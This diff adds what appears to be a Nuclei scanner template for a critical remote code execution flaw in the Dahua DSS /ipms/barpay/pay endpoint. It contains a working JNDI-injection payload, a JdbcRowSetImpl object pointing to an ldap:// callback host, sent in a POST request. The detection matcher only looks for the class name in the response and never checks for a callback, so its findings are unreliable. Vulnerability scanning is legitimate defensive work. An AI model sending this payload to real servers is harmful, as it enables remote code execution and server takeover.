@@ -1,0 +1,38 @@
+id: dahua-dss-rce
+info:
+  name: Dahua DSS /ipms/barpay/pay Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Dahua Smart Park solutions have a code execution vulnerability in /ipms/barpay/pay,
+    allowing attackers to execute code, write backdoors, and gain server control.
+  reference:
+    - https://www.dahuatech.com/product/info/5609.html
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /ipms/barpay/pay HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{interactsh-url}}", "autoCommit": true}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JdbcRowSetImpl"
+    extractors:
+      - type: regex
+        name: ldap_request
+        internal: true
+        part: body
+        regex:
+          - "(?i)JdbcRowSetImpl"
